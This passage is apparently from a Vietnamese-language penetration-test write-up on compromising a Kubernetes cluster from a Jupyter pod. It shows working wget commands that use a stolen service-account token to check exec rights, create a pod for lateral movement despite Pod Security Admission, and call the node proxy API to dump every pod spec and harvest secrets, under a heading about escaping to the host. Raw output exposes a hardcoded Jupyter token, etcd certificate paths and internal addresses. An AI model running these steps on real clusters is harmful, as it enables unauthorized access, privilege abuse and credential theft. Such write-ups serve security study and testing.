  --post-data='{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"corp-internal","verb":"create","resource":"pods","subresource":"exec"}}}' \
  "https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" 2>&1 | grep '"allowed"'
    "allowed": true,
```

**TẠO PRIVILEGED POD → ESCAPE RA HOST** 

![image.png](attachment:54272009-2707-4f46-b8f0-e7b16c3ba0cc:image.png)

**Pod Security Admission (PSA)** của namespace `corp-internal` đang enforce chính sách **`baseline`**.

Chính sách này **chặn** các pod có:

- ❌ `securityContext.privileged: true`
- ❌ `hostPID: true`, `hostNetwork: true`, `hostIPC: true`
- ❌ `hostPath` volume mount

> ⚠️ **Quan trọng**: Ngay cả khi bạn có `cluster-admin`, **Pod Security Admission vẫn có thể block** pod creation nếu vi phạm policy!
> 

![image.png](attachment:13c0ef16-14ad-4c7a-9005-e4083da9f072:image.png)

**Tạo Pod "Baseline-Compliant"** 

Tạo pod đơn giản, không privileged, nhưng vẫn có thể exec để lateral movement:

```jsx
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:/tmp/longth$ cat > /tmp/baseline-pod.json << 'EOF'
{"apiVersion":"v1","kind":"Pod","metadata":{"name":"baseline-pod","namespace":"corp-internal"},"spec":{"containers":[{"name":"shell","image":"alpine:latest","command":["/bin/sh","-c","sleep 3600"],"securityContext":{"allowPrivilegeEscalation":false,"capabilities":{"drop":["ALL"]}}}]}}
EOF
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:/tmp/longth$ wget -v --no-check-certificate \
  --header="Authorization: Bearer ${TOKEN}" \
  --header="Content-Type: application/json" \
  --post-file=/tmp/baseline-pod.json \
  "https://kubernetes.default.svc/api/v1/namespaces/corp-internal/pods" 2>&1 | grep -E "HTTP|Created"
HTTP request sent, awaiting response... 201 Created
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:/tmp/longth$ 
```

![image.png](attachment:df82cedf-a396-47fe-8abc-eacb840602d5:image.png)

→ Nhưng để **chiếm host** từ pod "baseline-compliant" (không privileged, không hostPath), bạn cần dùng chiến thuật **"lách luật"**:

## **DÙNG NODE PROXY API QUA API SERVER**

### **Giải thích (ngắn):**

> **Dùng token cluster-admin để gọi kubelet proxy endpoint qua API Server**, trả về **full pod specs** của tất cả pods trên node — bao gồm **hardcoded secrets trong env vars** mà bình thường không thấy qua `kubectl get pods`.
> 

![image.png](attachment:493cd08d-0961-4c89-aa19-0d637158cfa8:image.png)

```jsx
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:/tmp/longth$ NODE_NAME="longth-cluster"
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:/tmp/longth$ wget --no-check-certificate -qO- \
  --header="Authorization: Bearer ${TOKEN}" \
  "https://kubernetes.default.svc/api/v1/nodes/${NODE_NAME}/proxy/pods" 2>&1 | head -50
{"kind":"PodList","apiVersion":"v1","metadata":{},"items":[{"metadata":{"name":"jupyter-lab-6694c6bcfd-j44tb","generateName":"jupyter-lab-6694c6bcfd-","namespace":"corp-internal","uid":"0ff07e11-6e21-4e6a-bbd3-47be581fe85f","resourceVersion":"380225","creationTimestamp":"2026-03-30T02:16:18Z","labels":{"app":"jupyter-lab","pod-template-hash":"6694c6bcfd"},"annotations":{"kubernetes.io/config.seen":"2026-03-30T02:16:18.619957129Z","kubernetes.io/config.source":"api"},"ownerReferences":[{"apiVersion":"apps/v1","kind":"ReplicaSet","name":"jupyter-lab-6694c6bcfd","uid":"11f1d292-3b57-498a-830d-307946df7fd1","controller":true,"blockOwnerDeletion":true}],"managedFields":[{"manager":"kube-controller-manager","operation":"Update","apiVersion":"v1","time":"2026-03-30T02:16:18Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:generateName":{},"f:labels":{".":{},"f:app":{},"f:pod-template-hash":{}},"f:ownerReferences":{".":{},"k:{\"uid\":\"11f1d292-3b57-498a-830d-307946df7fd1\"}":{}}},"f:spec":{"f:containers":{"k:{\"name\":\"jupyter\"}":{".":{},"f:args":{},"f:command":{},"f:image":{},"f:imagePullPolicy":{},"f:livenessProbe":{".":{},"f:failureThreshold":{},"f:httpGet":{".":{},"f:path":{},"f:port":{},"f:scheme":{}},"f:initialDelaySeconds":{},"f:periodSeconds":{},"f:successThreshold":{},"f:timeoutSeconds":{}},"f:name":{},"f:ports":{".":{},"k:{\"containerPort\":8888,\"protocol\":\"TCP\"}":{".":{},"f:containerPort":{},"f:name":{},"f:protocol":{}}},"f:readinessProbe":{".":{},"f:failureThreshold":{},"f:httpGet":{".":{},"f:path":{},"f:port":{},"f:scheme":{}},"f:initialDelaySeconds":{},"f:periodSeconds":{},"f:successThreshold":{},"f:timeoutSeconds":{}},"f:resources":{".":{},"f:limits":{".":{},"f:cpu":{},"f:memory":{}},"f:requests":{".":{},"f:cpu":{},"f:memory":{}}},"f:securityContext":{".":{},"f:allowPrivilegeEscalation":{},"f:capabilities":{".":{},"f:drop":{}}},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{".":{},"f:fsGroup":{}},"f:serviceAccount":{},"f:serviceAccountName":{},"f:terminationGracePeriodSeconds":{}}}}]},"spec":{"volumes":[{"name":"kube-api-access-gpn9g","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"containers":[{"name":"jupyter","image":"jupyter/base-notebook:python-3.11","command":["/bin/bash","-lc"],"args":["export JUPYTER_TOKEN='labtoken123'\nexec start-notebook.py \\\n  --ServerApp.ip=0.0.0.0 \\\n  --ServerApp.port=8888 \\\n  --ServerApp.allow_remote_access=True \\\n  --ServerApp.token=\"${JUPYTER_TOKEN}\" \\\n  --ServerApp.disable_check_xsrf=True\n"],"ports":[{"name":"web","containerPort":8888,"protocol":"TCP"}],"resources":{"limits":{"cpu":"500m","memory":"1Gi"},"requests":{"cpu":"200m","memory":"512Mi"}},"volumeMounts":[{"name":"kube-api-access-gpn9g","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"livenessProbe":{"httpGet":{"path":"/lab","port":8888,"scheme":"HTTP"},"initialDelaySeconds":30,"timeoutSeconds":1,"periodSeconds":20,"successThreshold":1,"failureThreshold":3},"readinessProbe":{"httpGet":{"path":"/lab","port":8888,"scheme":"HTTP"},"initialDelaySeconds":15,"timeoutSeconds":1,"periodSeconds":10,"successThreshold":1,"failureThreshold":3},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent","securityContext":{"capabilities":{"drop":["ALL"]},"allowPrivilegeEscalation":false}}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","serviceAccountName":"default","serviceAccount":"default","nodeName":"longth-cluster","securityContext":{"fsGroup":100},"schedulerName":"default-scheduler","tolerations":[{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute","tolerationSeconds":300},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute","tolerationSeconds":300}],"priority":0,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Running","conditions":[{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:16:23Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:16:18Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:16:38Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:16:38Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:16:18Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"podIP":"10.244.0.187","podIPs":[{"ip":"10.244.0.187"}],"startTime":"2026-03-30T02:16:18Z","containerStatuses":[{"name":"jupyter","state":{"running":{"startedAt":"2026-03-30T02:16:23Z"}},"lastState":{},"ready":true,"restartCount":0,"image":"docker.io/jupyter/base-notebook:latest","imageID":"docker.io/jupyter/base-notebook@sha256:8c903974902b0e9d45d9823c2234411de0614c5c98c4bb782b3d4f55b3e435e6","containerID":"containerd://1d242ee40774173c2a97625ca5255fddc829161b0f65ee8a2ed005bc8f4e31a5","started":true,"volumeMounts":[{"name":"kube-api-access-gpn9g","mountPath":"/var/run/secrets/kubernetes.io/serviceaccount","readOnly":true,"recursiveReadOnly":"Disabled"}]}],"qosClass":"Burstable"}},{"metadata":{"name":"etcd-longth-cluster","namespace":"kube-system","uid":"fca18841b1b4addca5f149c891b60fda","creationTimestamp":null,"labels":{"component":"etcd","tier":"control-plane"},"annotations":{"kubeadm.kubernetes.io/etcd.advertise-client-urls":"https://192.168.213.128:2379","kubernetes.io/config.hash":"fca18841b1b4addca5f149c891b60fda","kubernetes.io/config.seen":"2026-03-30T02:04:56.212876900Z","kubernetes.io/config.source":"file"}},"spec":{"volumes":[{"name":"etcd-certs","hostPath":{"path":"/etc/kubernetes/pki/etcd","type":"DirectoryOrCreate"}},{"name":"etcd-data","hostPath":{"path":"/var/lib/etcd","type":"DirectoryOrCreate"}}],"containers":[{"name":"etcd","image":"registry.k8s.io/etcd:3.5.15-0","command":["etcd","--advertise-client-urls=https://192.168.213.128:2379","--cert-file=/etc/kubernetes/pki/etcd/server.crt","--client-cert-auth=true","--data-dir=/var/lib/etcd","--experimental-initial-corrupt-check=true","--experimental-watch-progress-notify-interval=5s","--initial-advertise-peer-urls=https://192.168.213.128:2380","--initial-cluster=longth-cluster=https://192.168.213.128:2380","--key-file=/etc/kubernetes/pki/etcd/server.key","--listen-client-urls=https://127.0.0.1:2379,https://192.168.213.128:2379","--listen-metrics-urls=http://127.0.0.1:2381","--listen-peer-urls=https://192.168.213.128:2380","--name=longth-cluster","--peer-cert-file=/etc/kubernetes/pki/etcd/peer.crt","--peer-client-cert-auth=true","--peer-key-file=/etc/kubernetes/pki/etcd/peer.key","--peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt","--snapshot-count=10000","--trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt"],"resources":{"requests":{"cpu":"100m","memory":"100Mi"}},"volumeMounts":[{"name":"etcd-data","mountPath":"/var/lib/etcd"},{"name":"etcd-certs","mountPath":"/etc/kubernetes/pki/etcd"}],"livenessProbe":{"httpGet":{"path":"/livez","port":2381,"host":"127.0.0.1","scheme":"HTTP"},"initialDelaySeconds":10,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":8},"readinessProbe":{"httpGet":{"path":"/readyz","port":2381,"host":"127.0.0.1","scheme":"HTTP"},"timeoutSeconds":15,"periodSeconds":1,"successThreshold":1,"failureThreshold":3},"startupProbe":{"httpGet":{"path":"/readyz","port":2381,"host":"127.0.0.1","scheme":"HTTP"},"initialDelaySeconds":10,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":24},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","nodeName":"longth-cluster","hostNetwork":true,"securityContext":{"seccompProfile":{"type":"RuntimeDefault"}},"schedulerName":"default-scheduler","tolerations":[{"operator":"Exists","effect":"NoExecute"}],"priorityClassName":"system-node-critical","priority":2000001000,"enableServiceLinks":true},"status":{"phase":"Running","conditions":[{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:04:57Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:04:56Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:11Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:11Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:04:56Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"podIP":"192.168.213.128","podIPs":[{"ip":"192.168.213.128"}],"startTime":"2026-03-30T02:04:56Z","containerStatuses":[{"name":"etcd","state":{"running":{"startedAt":"2026-03-30T02:04:57Z"}},"lastState":{"terminated":{"exitCode":255,"reason":"Unknown","startedAt":"2026-03-27T06:57:14Z","finishedAt":"2026-03-30T02:04:45Z","containerID":"containerd://4832d17c6ffa4ec12f38c97bf68a7256dd384936900639a5ce8b9c49e3d7612c"}},"ready":true,"restartCount":48,"image":"registry.k8s.io/etcd:3.5.15-0","imageID":"registry.k8s.io/etcd@sha256:a6dc63e6e8cfa0307d7851762fa6b629afb18f28d8aa3fab5a6e91b4af60026a","containerID":"containerd://f341ff8eb506eff9e07cf7c60ef1926395c93aa2023b43720ae6d1f08531f0a5","started":true}],"qosClass":"Burstable"}},{"metadata":{"name":"kube-flannel-ds-gbgjr","generateName":"kube-flannel-ds-","namespace":"kube-flannel","uid":"05e68a6b-21d9-49cc-ba27-4c9762abac50","resourceVersion":"371498","creationTimestamp":"2025-09-23T07:49:05Z","labels":{"app":"flannel","controller-revision-hash":"65fb648965","pod-template-generation":"1","tier":"node"},"annotations":{"kubernetes.io/config.seen":"2026-03-30T02:05:02.211819699Z","kubernetes.io/config.source":"api"},"ownerReferences":[{"apiVersion":"apps/v1","kind":"DaemonSet","name":"kube-flannel-ds","uid":"a79a5a0e-0884-433e-bf9a-6b56a8133caf","controller":true,"blockOwnerDeletion":true}],"managedFields":[{"manager":"kube-controller-manager","operation":"Update","apiVersion":"v1","time":"2025-09-23T07:49:05Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:generateName":{},"f:labels":{".":{},"f:app":{},"f:controller-revision-hash":{},"f:pod-template-generation":{},"f:tier":{}},"f:ownerReferences":{".":{},"k:{\"uid\":\"a79a5a0e-0884-433e-bf9a-6b56a8133caf\"}":{}}},"f:spec":{"f:affinity":{".":{},"f:nodeAffinity":{".":{},"f:requiredDuringSchedulingIgnoredDuringExecution":{}}},"f:containers":{"k:{\"name\":\"kube-flannel\"}":{".":{},"f:args":{},"f:command":{},"f:env":{".":{},"k:{\"name\":\"CONT_WHEN_CACHE_NOT_READY\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"EVENT_QUEUE_DEPTH\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"POD_NAME\"}":{".":{},"f:name":{},"f:valueFrom":{".":{},"f:fieldRef":{}}},"k:{\"name\":\"POD_NAMESPACE\"}":{".":{},"f:name":{},"f:valueFrom":{".":{},"f:fieldRef":{}}}},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{".":{},"f:requests":{".":{},"f:cpu":{},"f:memory":{}}},"f:securityContext":{".":{},"f:capabilities":{".":{},"f:add":{}},"f:privileged":{}},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/etc/kube-flannel/\"}":{".":{},"f:mountPath":{},"f:name":{}},"k:{\"mountPath\":\"/run/flannel\"}":{".":{},"f:mountPath":{},"f:name":{}},"k:{\"mountPath\":\"/run/xtables.lock\"}":{".":{},"f:mountPath":{},"f:name":{}}}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:hostNetwork":{},"f:initContainers":{".":{},"k:{\"name\":\"install-cni\"}":{".":{},"f:args":{},"f:command":{},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/etc/cni/net.d\"}":{".":{},"f:mountPath":{},"f:name":{}},"k:{\"mountPath\":\"/etc/kube-flannel/\"}":{".":{},"f:mountPath":{},"f:name":{}}}},"k:{\"name\":\"install-cni-plugin\"}":{".":{},"f:args":{},"f:command":{},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/opt/cni/bin\"}":{".":{},"f:mountPath":{},"f:name":{}}}}},"f:priorityClassName":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:serviceAccount":{},"f:serviceAccountName":{},"f:terminationGracePeriodSeconds":{},"f:tolerations":{},"f:volumes":{".":{},"k:{\"name\":\"cni\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}},"k:{\"name\":\"cni-plugin\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}},"k:{\"name\":\"flannel-cfg\"}":{".":{},"f:configMap":{".":{},"f:defaultMode":{},"f:name":{}},"f:name":{}},"k:{\"name\":\"run\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}},"k:{\"name\":\"xtables-lock\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}}}}}},{"manager":"kubelet","operation":"Update","apiVersion":"v1","time":"2026-03-27T06:57:24Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:conditions":{"k:{\"type\":\"ContainersReady\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Initialized\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"PodReadyToStartContainers\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Ready\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}}},"f:containerStatuses":{},"f:hostIP":{},"f:hostIPs":{},"f:initContainerStatuses":{},"f:phase":{},"f:podIP":{},"f:podIPs":{".":{},"k:{\"ip\":\"192.168.213.128\"}":{".":{},"f:ip":{}}},"f:startTime":{}}},"subresource":"status"}]},"spec":{"volumes":[{"name":"run","hostPath":{"path":"/run/flannel","type":""}},{"name":"cni-plugin","hostPath":{"path":"/opt/cni/bin","type":""}},{"name":"cni","hostPath":{"path":"/etc/cni/net.d","type":""}},{"name":"flannel-cfg","configMap":{"name":"kube-flannel-cfg","defaultMode":420}},{"name":"xtables-lock","hostPath":{"path":"/run/xtables.lock","type":"FileOrCreate"}},{"name":"kube-api-access-vb24x","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"initContainers":[{"name":"install-cni-plugin","image":"ghcr.io/flannel-io/flannel-cni-plugin:v1.7.1-flannel1","command":["cp"],"args":["-f","/flannel","/opt/cni/bin/flannel"],"resources":{},"volumeMounts":[{"name":"cni-plugin","mountPath":"/opt/cni/bin"},{"name":"kube-api-access-vb24x","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"},{"name":"install-cni","image":"ghcr.io/flannel-io/flannel:v0.27.3","command":["cp"],"args":["-f","/etc/kube-flannel/cni-conf.json","/etc/cni/net.d/10-flannel.conflist"],"resources":{},"volumeMounts":[{"name":"cni","mountPath":"/etc/cni/net.d"},{"name":"flannel-cfg","mountPath":"/etc/kube-flannel/"},{"name":"kube-api-access-vb24x","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"}],"containers":[{"name":"kube-flannel","image":"ghcr.io/flannel-io/flannel:v0.27.3","command":["/opt/bin/flanneld"],"args":["--ip-masq","--kube-subnet-mgr"],"env":[{"name":"POD_NAME","valueFrom":{"fieldRef":{"apiVersion":"v1","fieldPath":"metadata.name"}}},{"name":"POD_NAMESPACE","valueFrom":{"fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}},{"name":"EVENT_QUEUE_DEPTH","value":"5000"},{"name":"CONT_WHEN_CACHE_NOT_READY","value":"false"}],"resources":{"requests":{"cpu":"100m","memory":"50Mi"}},"volumeMounts":[{"name":"run","mountPath":"/run/flannel"},{"name":"flannel-cfg","mountPath":"/etc/kube-flannel/"},{"name":"xtables-lock","mountPath":"/run/xtables.lock"},{"name":"kube-api-access-vb24x","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent","securityContext":{"capabilities":{"add":["NET_ADMIN","NET_RAW"]},"privileged":false}}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","serviceAccountName":"flannel","serviceAccount":"flannel","nodeName":"longth-cluster","hostNetwork":true,"securityContext":{},"affinity":{"nodeAffinity":{"requiredDuringSchedulingIgnoredDuringExecution":{"nodeSelectorTerms":[{"matchFields":[{"key":"metadata.name","operator":"In","values":["longth-cluster"]}]}]}}},"schedulerName":"default-scheduler","tolerations":[{"operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute"},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute"},{"key":"node.kubernetes.io/disk-pressure","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/memory-pressure","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/pid-pressure","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/unschedulable","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/network-unavailable","operator":"Exists","effect":"NoSchedule"}],"priorityClassName":"system-node-critical","priority":2000001000,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Running","conditions":[{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:03Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2025-09-23T07:49:08Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:05Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:05Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2025-09-23T07:49:05Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"podIP":"192.168.213.128","podIPs":[{"ip":"192.168.213.128"}],"startTime":"2025-09-23T07:49:05Z","initContainerStatuses":[{"name":"install-cni-plugin","state":{"terminated":{"exitCode":0,"reason":"Completed","startedAt":"2026-03-30T02:05:02Z","finishedAt":"2026-03-30T02:05:03Z","containerID":"containerd://b83469881d415bc7b973ecbb96b529d68c2bacb1e5b42fe38aa0aa77fdeab8d9"}},"lastState":{},"ready":true,"restartCount":48,"image":"ghcr.io/flannel-io/flannel-cni-plugin:v1.7.1-flannel1","imageID":"ghcr.io/flannel-io/flannel-cni-plugin@sha256:cb3176a2c9eae5fa0acd7f45397e706eacb4577dac33cad89f93b775ff5611df","containerID":"containerd://b83469881d415bc7b973ecbb96b529d68c2bacb1e5b42fe38aa0aa77fdeab8d9","started":false,"volumeMounts":[{"name":"cni-plugin","mountPath":"/opt/cni/bin"},{"name":"kube-api-access-vb24x","mountPath":"/var/run/secrets/kubernetes.io/serviceaccount","readOnly":true,"recursiveReadOnly":"Disabled"}]},{"name":"install-cni","state":{"terminated":{"exitCode":0,"reason":"Completed","startedAt":"2026-03-30T02:05:03Z","finishedAt":"2026-03-30T02:05:03Z","containerID":"containerd://359a3d68992d953e70ffcac9683abbb161a1bc5ad7b0627c51abd7ff9f527fe2"}},"lastState":{},"ready":true,"restartCount":0,"image":"ghcr.io/flannel-io/flannel:v0.27.3","imageID":"ghcr.io/flannel-io/flannel@sha256:8cc0cf9e94df48e98be84bce3e61984bbd46c3c44ad35707ec7ef40e96b009d1","containerID":"containerd://359a3d68992d953e70ffcac9683abbb161a1bc5ad7b0627c51abd7ff9f527fe2","started":false,"volumeMounts":[{"name":"cni","mountPath":"/etc/cni/net.d"},{"name":"flannel-cfg","mountPath":"/etc/kube-flannel/"},{"name":"kube-api-access-vb24x","mountPath":"/var/run/secrets/kubernetes.io/serviceaccount","readOnly":true,"recursiveReadOnly":"Disabled"}]}],"containerStatuses":[{"name":"kube-flannel","state":{"running":{"startedAt":"2026-03-30T02:05:04Z"}},"lastState":{"terminated":{"exitCode":255,"reason":"Unknown","startedAt":"2026-03-27T06:57:23Z","finishedAt":"2026-03-30T02:04:45Z","containerID":"containerd://fd90f9b09b1f273b8aac0944e5a723f4763dc14f800b56df67e98957a7e98a91"}},"ready":true,"restartCount":48,"image":"ghcr.io/flannel-io/flannel:v0.27.3","imageID":"ghcr.io/flannel-io/flannel@sha256:8cc0cf9e94df48e98be84bce3e61984bbd46c3c44ad35707ec7ef40e96b009d1","containerID":"containerd://08c96a37376085a170c1688de6cf1251734da121809d4d0dae80955cce8f6d7d","started":true,"volumeMounts":[{"name":"run","mountPath":"/run/flannel"},{"name":"flannel-cfg","mountPath":"/etc/kube-flannel/"},{"name":"xtables-lock","mountPath":"/run/xtables.lock"},{"name":"kube-api-access-vb24x","mountPath":"/var/run/secrets/kubernetes.io/serviceaccount","readOnly":true,"recursiveReadOnly":"Disabled"}]}],"qosClass":"Burstable"}},{"metadata":{"name":"twistlock-defender-ds-xcddh","generateName":"twistlock-defender-ds-","namespace":"twistlock","uid":"e0cb1442-5cfe-4364-8df8-2d58e83a64b0","resourceVersion":"371493","creationTimestamp":"2025-09-24T06:20:58Z","labels":{"app":"twistlock-defender","controller-revision-hash":"5b8dbfd8b7","pod-template-generation":"1"},"annotations":{"container.apparmor.security.beta.kubernetes.io/twistlock-defender":"unconfined","kubernetes.io/config.seen":"2026-03-30T02:05:02.211827105Z","kubernetes.io/config.source":"api"},"ownerReferences":[{"apiVersion":"apps/v1","kind":"DaemonSet","name":"twistlock-defender-ds","uid":"212e9376-605f-4bf5-843a-db4c0d40a12f","controller":true,"blockOwnerDeletion":true}],"managedFields":[{"manager":"kube-controller-manager","operation":"Update","apiVersion":"v1","time":"2025-09-24T06:20:58Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:container.apparmor.security.beta.kubernetes.io/twistlock-defender":{}},"f:generateName":{},"f:labels":{".":{},"f:app":{},"f:controller-revision-hash":{},"f:pod-template-generation":{}},"f:ownerReferences":{".":{},"k:{\"uid\":\"212e9376-605f-4bf5-843a-db4c0d40a12f\"}":{}}},"f:spec":{"f:affinity":{".":{},"f:nodeAffinity":{".":{},"f:requiredDuringSchedulingIgnoredDuringExecution":{}}},"f:containers":{"k:{\"name\":\"twistlock-defender\"}":{".":{},"f:env":{".":{},"k:{\"name\":\"CLOUD_HOSTNAME_ENABLED\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"COLLECT_POD_LABELS\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"DEFENDER_CLUSTER\"}":{".":{},"f:name":{}},"k:{\"name\":\"DEFENDER_CLUSTER_ID\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"DEFENDER_CLUSTER_NAME_RESOLVING_METHOD\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"DEFENDER_TYPE\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"DOCKER_CLIENT_ADDRESS\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"FIPS_ENABLED\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"HOST_CUSTOM_COMPLIANCE_ENABLED\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"INSTALL_BUNDLE\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"LOG_PROD\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"MONITOR_ISTIO\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"MONITOR_SERVICE_ACCOUNTS\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"SYSTEMD_ENABLED\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"WS_ADDRESS\"}":{".":{},"f:name":{},"f:value":{}}},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{".":{},"f:limits":{".":{},"f:cpu":{},"f:memory":{}},"f:requests":{".":{},"f:cpu":{},"f:memory":{}}},"f:securityContext":{".":{},"f:capabilities":{".":{},"f:add":{}},"f:privileged":{},"f:readOnlyRootFilesystem":{}},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/dev/log\"}":{".":{},"f:mountPath":{},"f:name":{}},"k:{\"mountPath\":\"/etc/passwd\"}":{".":{},"f:mountPath":{},"f:name":{},"f:readOnly":{}},"k:{\"mountPath\":\"/run\"}":{".":{},"f:mountPath":{},"f:name":{}},"k:{\"mountPath\":\"/var/lib/containerd\"}":{".":{},"f:mountPath":{},"f:name":{}},"k:{\"mountPath\":\"/var/lib/rancher/rke2/agent/containerd\"}"